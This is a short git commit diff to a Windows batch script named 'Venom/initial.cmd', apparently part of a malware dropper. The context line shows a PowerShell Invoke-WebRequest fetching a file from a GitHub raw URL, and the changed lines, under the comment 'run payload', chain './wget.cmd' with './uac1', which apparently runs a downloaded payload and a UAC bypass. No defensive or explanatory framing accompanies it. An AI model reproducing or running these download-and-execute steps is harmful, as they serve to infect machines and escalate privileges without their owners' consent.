606a66b39e67a0dad239cdadbd5f434d394e5d54
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-01-31 18:58:39 -0900

    initial run

--- Venom/initial.cmd
+++ Venom/initial.cmd
@@ -30,8 +30,8 @@ powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.
 
 
 @REM run payload
-powershell ./wget.cmd
-./uac1
+powershell ./wget.cmd; ./uac1
+
 @REM cd back into initial location
 cd "%INITIALPATH%"
 
